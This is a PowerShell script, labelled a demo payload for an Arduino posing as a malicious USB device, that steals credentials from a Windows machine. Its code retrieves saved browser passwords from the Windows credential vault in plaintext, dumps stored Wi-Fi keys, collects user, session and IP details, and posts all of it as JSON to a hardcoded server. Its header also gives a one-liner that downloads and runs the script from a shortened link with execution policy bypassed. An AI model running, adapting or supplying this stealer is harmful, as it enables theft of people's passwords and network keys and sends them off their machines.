<#
.SYNOPSIS
Demo to get cached credentials, wifi and upload to webserver
.DESCRIPTION
Performs the following task
    - Get credentials from IE vault
    - Get saved wifi passwords
    - Get host information
    - Upload to webserver
            
.NOTES
        Author: Mattias Grondahl  Date  : October 14, 2018   
        Demo payload for arduino configured as evil usb 
.PARAMETERS
    -output
        Enter output path
        Example: ./GetCredentials.ps1 -output C:\windows\temp\out
    -url
        Enter url where the data will be sent as a json request
        Example: ./GetCredentials.ps1 -url http://192.168.1.174/data
    
.EXAMPLE 
#Run script with parameters
.\GetCredentials.ps1 -output C:\windows\temp\out -url http://192.168.1.174/data
#Run from github
powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘https://bit.ly/2El9Fyw’)"
#>

[CmdletBinding()]
Param(
  [Parameter(Mandatory=$False,Position=1)]
   [string]$output,
	
   [Parameter(Mandatory=$False,Position=2)]
   [string]$url
)

#Suppress Errors (set to Continue to show errors on run)
$ErrorActionPreference = "Continue"
$Error.count
#New-Item Errors.log -type file
$date = (Get-Date).ToString('yyyy-MM-dd_HHmm')

#for demo
$output = "C:\temp\" + "$date" + "out.log"
$url = "http://192.168.1.174/data"

function Getcreds {
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll() | % { $_.RetrievePassword();$_ }
}

function Getwifi {
$output = netsh.exe wlan show profiles
$profileRows = $output | Select-String -Pattern 'All User Profile'
$profileNames = New-Object System.Collections.ArrayList
for($i = 0; $i -lt $profileRows.Count; $i++){
    $profileName = ($profileRows[$i] -split ":")[-1].Trim()
    
    $profileOutput = netsh.exe wlan show profiles name="$profileName" key=clear
    
    $SSIDSearchResult = $profileOutput| Select-String -Pattern 'SSID Name'
    $profileSSID = ($SSIDSearchResult -split ":")[-1].Trim() -replace '"'

    $passwordSearchResult = $profileOutput| Select-String -Pattern 'Key Content'
    if($passwordSearchResult){
        $profilePw = ($passwordSearchResult -split ":")[-1].Trim()
    } else {
        $profilePw = ''
    }
    $networkObject = New-Object -TypeName psobject -Property @{
        ProfileName = $profileName
        SSID = $profileSSID
        Password = $profilePw
    }
    $profileNames.Add($networkObject)
}
$profileNames | Sort-Object ProfileName | Select-Object ProfileName, SSID, Password
}

function sysinfo {
$user = Whoami
$localusers = Get-LocalUser
$sessions = query user
$env:HostIP = ( `
    Get-NetIPConfiguration | `
    Where-Object { `
        $_.IPv4DefaultGateway -ne $null `
        -and `
        $_.NetAdapter.Status -ne "Disconnected" `
    } `
).IPv4Address.IPAddress
$user
$localusers
$sessions
$env:HostIP
}


function upload([string]$url){
Invoke-RestMethod -Method 'POST' -Uri "$url" -Body $Body
}

function log($Body) {
Add-Content -Path $output -Value $Body
Get-Content -Path $output | ConvertFrom-Json
}

$Body = @{
    cred=Getcreds
    wifi=Getwifi
    sysinfo=sysinfo
    users=$user
    ip=$env:HostIP
    }
$Body = $Body | ConvertTo-Json
sleep 1
$Object = $Body | ConvertTo-Json
###Run
log($Body)
if ($url -ne "") {
upload($url)
}
